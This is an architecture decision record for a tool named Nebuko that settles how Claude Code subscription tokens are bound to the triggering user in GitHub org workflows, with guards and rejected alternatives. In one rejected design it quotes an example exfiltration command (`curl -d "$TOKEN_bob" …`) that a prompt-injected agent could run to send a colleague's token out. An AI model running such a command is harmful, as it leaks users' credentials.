# ADR-0016: Claude Code Subscription Credential Strategies

**Status:** Accepted — 2026-10-22
**Decider:** Olivier Norture
**Related:** `docs/claude-code.md`, `docs/subscription-plans.md`, `docs/adoption.md`, ADR-0008 (secret-slot invariant), the `claude-code` backend (`src/nebuko/engine/lib/agent_script/features/claude_code_backend/`), `nebuko init anthropic-local-runner` (`src/nebuko/engine/init/local_runner.py`), Anthropic Consumer Terms, Anthropic support correspondence (2026-10), Claude Code docs (authentication, GitHub Actions)

## Context

The `claude-code` backend runs every role turn through the **unmodified Claude
Code binary** over ACP (`@agentclientprotocol/claude-agent-acp`), so usage can
be billed to a user's **Claude subscription** (Pro/Max/Team/Enterprise seat)
instead of an API key. The requirement this ADR settles: make that work **for a
GitHub organization** — e.g. ten developers, each with their own subscription,
any of whom can trigger a run from any number of org repos, public and private
— while staying inside Anthropic's terms.

### The compliance inputs

Anthropic's Consumer Terms prohibit sharing account credentials, reselling,
and — except via an API key or where explicitly permitted — automated access.
The permission for our case, from Anthropic support (email on file, 2026-10):

> Based on how you've described pi-claude-bridge — it calls the official,
> unmodified `claude -p` CLI, which you've authenticated yourself through
> Anthropic's normal sign-in with your own Max subscription — this is
> permitted. [...] What's prohibited is a third party collecting or storing
> your credentials, offering its own Claude.ai login inside its app, or
> routing other people's usage through your subscription (or the reverse).
> This would stop being fine if pi-claude-bridge modified the Claude Code
> binary itself, or if it were used to let other people's requests run
> through your subscription.

Which yields four hard rules for any strategy:

1. **Binary only.** The subscription token may only be exercised by the
   unmodified Claude Code binary. Nebuko must never extract a token and call
   `api.anthropic.com` directly — not even for a "cheap" side call.
2. **No custody.** Nebuko — tool, reusable workflow, backend, or broker —
   never collects or stores a Claude credential. The *user* storing their own
   token in their own GitHub repo secret is sanctioned: Anthropic's own
   `claude-code-action` and its `/install-github-app` flow write
   `CLAUDE_CODE_OAUTH_TOKEN` as a repository secret.
3. **Actor↔credential binding.** No routing usage through someone else's
   subscription, in either direction ("or the reverse"). Every human-triggered
   run must bill the subscription of the GitHub-authenticated triggerer.
4. **Automation gets no personal tokens.** Machine-triggered runs (cron, bots)
   have no actor to bind to. Anthropic's org guidance is explicit: for shared
   use, "authenticate with an API key from the Claude Console rather than an
   OAuth token, since an OAuth token is tied to the subscription of the
   person who ran `claude setup-token`".

### Facts that shape the solution space

- `claude setup-token` mints a **~1-year personal OAuth token**
  (`CLAUDE_CODE_OAUTH_TOKEN`), printed to the terminal, saved nowhere by the
  CLI. Interactive `/login` credentials live in the user's keychain /
  `~/.claude/.credentials.json`, owned by the binary — Nebuko never reads,
  copies, or uploads that file in any strategy.
- GitHub Actions has **no actor-scoped secret primitive**: the `secrets`
  context cannot be indexed dynamically, secrets are readable by any workflow
  in the repo, and no ACL binds a secret to a triggering actor. A repo's
  *ownership* is the only actor-scoped container GitHub offers.
- Self-hosted runner **labels are routing hints, not ACLs**: any workflow in a
  repo the runner group serves can request any label. GitHub's scheduler,
  however, is the one component that maps a computed label to a machine.
- Workload identity federation (GitHub OIDC → Console service account) gives
  **API-billed**, short-lived credentials with no stored secret — it does not
  exercise a subscription.
- Nebuko today: PAT mode (`GH_PAT` fallback) + the OIDC token broker
  (`token-broker.nebuko.dev`, backed by the GitHub App), the
  `nebuko-<login>`-labelled self-hosted runner flow, and the reusable
  workflow's `CLAUDE_CODE_OAUTH_TOKEN` secret chain (`::add-mask::`, exported
  only when non-empty, never echoed). ADR-0008's invariant — credential
  values never travel through `with:` inputs, which the engine serializes
  into agent context — applies to every lane below.

## Decision

**Ship a multi-lane architecture bound by one invariant: a human-triggered
run bills the triggerer's own subscription; a machine-triggered run bills org
API credentials; Nebuko holds zero Claude credentials in every lane.**

### The lanes

**Lane L — local interactive (baseline).** Nebuko runs on the user's machine;
Claude Code uses its own `/login` session from the keychain. This is the
email's sanctioned shape verbatim ("a single-user local bridge"). No GitHub
involvement, no credential handling at all.

**Lane S — single-user repo secret.** One user's repo,
`CLAUDE_CODE_OAUTH_TOKEN` as a repository secret, GitHub-hosted runner —
Anthropic's own `claude-code-action` pattern, unchanged. **Scoped to
single-user semantics**: valid because the repo has exactly one triggerer. In
a multi-user repo this lane degenerates into the first rejected alternative
below and must be refused (guard 1).

**Lane R — actor-bound self-hosted runners.** Each org member registers their
own org-level runner(s) with `nebuko init anthropic-local-runner --org <org>`
(label `nebuko-<login>`, token in the runner's `0600 .env`, never a GitHub
secret). The reusable workflow computes `runs-on` from the trigger author:

```yaml
runs-on: ${{ inputs.runner_strategy == 'per-user' &&
             format('nebuko-{0}',
                    github.event.comment.user.login ||
                    github.event.issue.user.login ||
                    github.triggering_actor.login) ||
             inputs.runs_on || 'ubuntu-latest' }}
```

GitHub's scheduler does the actor→machine match; the token exists in exactly
one place and reaches a job only by being scheduled onto that machine. No
Claude credential is stored anywhere in GitHub.

**Lane D — per-user credential repo + App bridge.** Each user keeps a private
`<login>/nebuko-claude-code` repo holding their own
`CLAUDE_CODE_OAUTH_TOKEN` secret, plus a thin workflow pinned to the reusable
workflow's SHA. The GitHub App (webhook endpoint on the token broker, which
already holds the App key) bridges org-repo events:

```
issue_comment(created) → CALLER_AUTH checks → actor = comment.user.login
  → target = "{actor}/nebuko-claude-code"        # deterministic, no mapping table
  → mint 1h installation tokens (user repo, org repo)
  → POST /repos/{target}/dispatches  (event_type: nebuko-run,
       client_payload: { actor, org_repo, issue_number, prompt_body, gh_token })
```

The user-repo workflow first asserts
`github.event.client_payload.actor == github.repository_owner` (guard 4),
then calls the reusable workflow with its own secret and the 1h org-scoped
`GH_TOKEN`. Repo permissions are a **real ACL**: no other member can dispatch
into your repo or reach your secret, which makes the binding a hard boundary
rather than a routing convention.

**Lane K — org automation.** Scheduled/bot/external runs take
`ANTHROPIC_API_KEY` (Console) on hosted runners, or — preferred once the
broker supports it — workload identity federation (GitHub OIDC → Console
service account: `fdrl_…` federation rule, no long-lived secret stored at
all). API billing; zero personal tokens. `claude-code` runs triggered by
bots are refused in per-user modes (guard 3).

**Lane C — cloud providers (out of scope here).** The `use_bedrock` /
`use_vertex` / `use_foundry` path: GitHub OIDC → cloud IAM, short-lived cloud
credentials, cloud billing. Orthogonal to subscriptions; supported by the
same binary and not further specified.

### Comparison

| Lane | Trigger | Token stored | Bills | Binding mechanism | Limits |
|------|---------|--------------|-------|-------------------|--------|
| L | local user | user's keychain (binary-owned) | their subscription | physical machine | — |
| S | the repo's one user | their repo secret (GitHub) | their subscription | single-user semantics | 6h hosted job |
| R | org member | their runner's `.env` only | triggerer's subscription | scheduler label match | runner must be online; label-spoof insider risk (guards 5–6) |
| D | org member | their private repo secret (GitHub) | triggerer's subscription | **repo ACL** + owner assert | 6h hosted job; user's Actions minutes |
| K | machine | none (WIF) or org secret | org (API) | no personal token involved | — |

### Guards (in-ware, fail-fast)

1. Per-user mode (R/D) with a shared `CLAUDE_CODE_OAUTH_TOKEN` repo secret
   also set → **hard error**: ambiguity breaks binding (today's step only
   skips *empty* secrets; a set one would silently shadow a runner's or
   caller's own token).
2. Per-user mode ignores and rejects static `runs_on` values starting with
   `nebuko-`: `runs-on` is computed from the event author only. A caller
   passing a colleague's label is the routing violation as a one-liner.
3. Bot actors (`endsWith(actor, '[bot]')`), `schedule`, and actor-less events
   → refuse the `claude-code` backend with an actionable comment; point at
   Lane K.
4. The user-repo workflow (D) asserts `client_payload.actor ==
   repository_owner` before anything runs: even a buggy or misconfigured
   bridge cannot land someone else's work on your token.
5. The bridge's actor→repo mapping is the **rule** `actor == repo owner` —
   never a configurable table. A mapping database is where routing violations
   breed.
6. Insider risk on lane R (a member writing a custom workflow targeting
   `runs-on: nebuko-<colleague>`): labels are not ACLs, so this is mitigated
   by branch protection on `.github/workflows/**`, pinning `uses:` to a SHA,
   and a watchdog that flags runs whose runner label ≠ trigger actor and
   duplicate label registrations. Same trust boundary as existing repo
   secrets; documented, not hidden.
7. ADR-0008's invariant holds everywhere: values never through `with:`
   inputs; the bridge's `gh_token` travels as a `secrets:` mapping entry and
   is `::add-mask::`ed.

## Alternatives considered

**A1 — Shared repo/org OAuth secret in a multi-user repo.** One member's
setup-token as an org-level secret serving ten triggerers: nine people's usage
through one subscription — rule 3 by configuration. Anthropic's own docs steer
away ("rather than an OAuth token…"), and even on Team/Enterprise, where
billing lands on the org, it still violates the seat-holder's account terms
("make your Account available to anyone else"), breaks attribution and
revocation, and pools a personal credential into every org workflow. Rejected.

**A2 — Static single-owner runner label** (`runs_on: nebuko-<owner>`, today's
single-user doc story) **in multi-user repos.** All triggers land on the
owner's runner and token — the same routing violation via a label. Valid only
in Lane S semantics. Superseded by Lane R's computed label.

**A3 — Per-user secret selection ("load the user's own secret").** The right
instinct (it *is* rule 3) but GitHub mechanics make it the worst option: the
`secrets` context cannot be indexed dynamically, so a selector step must
materialize **all** users' tokens into its env and pick one. Consequences:
every member's token structurally shared with every other member and every
workflow ("share your Account login information" as an architecture
property); one prompt-injection exfiltration (`curl -d "$TOKEN_bob" …`) walks
away with ten subscriptions — masking covers logs, not exfiltration; and the
selector is a convention, not a boundary, since members can reference any
`secrets.*` directly. Dominated by R (no co-location) and D (real ACL).
Rejected.

**A4 — Nebuko as credential custodian** (hosted vault, "connect your Claude
account" login-proxy, "login with Anthropic via Nebuko" OAuth flow, hosted
runners accepting user tokens). Makes Nebuko the "third party collecting or
storing your credentials" (rule 2) and structurally a subscription reseller.
Rejected regardless of encryption-at-rest promises.

**A5 — Reusing the interactive credential file** (copying
`~/.claude/.credentials.json` / keychain contents for CI or backend use).
Violates rule 2 (custody), fights the binary's refresh/revocation semantics,
and produces long-lived copies of session credentials. The sanctioned CI
instrument is `claude setup-token`. Rejected.

**A6 — Extracting the OAuth token to call the API directly** (e.g. for cheap
side-calls or provider routing). Rule 1 violation; also technically fragile
(the token is a bearer validated for the binary's flows). Rejected.

## Consequences

### Implementation roadmap

1. `nebuko-workflow.yaml`: `runner_strategy` input (`static` | `per-user`),
   computed `runs-on`, bot rejection, guards 1–2 (shadowing + static label).
2. Reusable workflow: a caller-provided `GH_PAT` fast path — when set, skip the
   OIDC broker step (it would otherwise overwrite `GH_TOKEN` with a token for
   the wrong repo) — plus `::add-mask::` parity.
3. `nebuko init claude-code-repo`: create the private repo, `gh secret set`
   the token, deep-link the App installation, write the pinned workflow
   template with the owner-assert guard.
4. Bridge: a `/webhooks/github` endpoint on the token broker — HMAC
   verification (`X-Hub-Signature-256`), CALLER_AUTH parity, idempotency on
   `comment.id`, deterministic target, two minted installation tokens,
   `repository_dispatch`. The broker holds the App private key and webhook
   secret; **no Claude credential ever reaches it.**
5. `local_runner.py`: optional `--runner-group` assignment (one `gh api`
   call) so org runners are group-scoped; keep the public-repo refusal.
6. Watchdog (backend or scheduled job, credential-free): runner label ≠
   trigger actor, duplicate label registration, offline-runner queue with an
   onboarding report (`X/10 members have runners`).
7. Docs: rewrite `docs/claude-code.md` (lanes S/R/D, guards, minutes cost,
  6h cap, offline queue, EMU caveat — no personal repos under enterprise-
  managed users, so Lane D is unavailable there and R applies), replace its
  "Check Anthropic's terms" placeholder with this ADR's mapping, and update
  `docs/subscription-plans.md` and `docs/adoption.md`.

### Accepted caveats

- **Lane D costs the user's Actions minutes** (private repo, hosted runners):
  a 1h agent run ≈ 60 Linux minutes; free tiers afford a handful of long runs.
  Lane R has no minutes cost. Say this in docs — it is the main adoption
  friction.
- **Lane R queues while the triggerer's runner is offline** (self-hosted jobs
  wait for a matching runner); the watchdog plus `--count ≥ 2` on always-on
  machines mitigate.
- **Lane D's payload `gh_token`** is visible to the repo owner via the run's
  event API: 1h-lived, org-repo-scoped, granting what the owner can already
  do. Documented, not hidden. Longer term, teach the broker to mint the
  org-scoped token from the user-repo OIDC claim and drop the payload token.
- **Public repos**: Lane R runners stay in groups that exclude public repos
  (GitHub default; keep the `--allow-public` refusal semantics); Lane D
  requires a *private* credential repo and keeps the comment-trigger
  CALLER_AUTH gate.

### Compliance mapping

| Rule | L | S | R | D | K |
|------|---|---|---|---|---|
| Binary only | ✓ | ✓ | ✓ | ✓ | ✓ (API lane, no subscription) |
| No Nebuko custody | ✓ | ✓ (GitHub is custodian) | ✓ (nothing in GitHub) | ✓ (GitHub is custodian) | ✓ |
| Actor binding | trivial | single user | scheduler label match | repo ACL + owner assert | n/a (org billing) |
| Automation separation | — | — | guard 3 | guard 3 | the lane itself |

### Enforcement posture

Anthropic's enforcement is account-level; the vendor risk is being
*categorized* as a reseller. The posture that keeps Nebuko safe: the compliant
behavior is the default on every path a user can reach without deliberately
attacking their own org; Nebuko never appears in a credential flow; marketing
says "bring your own subscription", never "we provide Claude". Users who
force a violation (shared secrets, custom cross-label workflows) do so as
their own visible act against their own accounts — and guards 1–5 make the
casual path impossible.
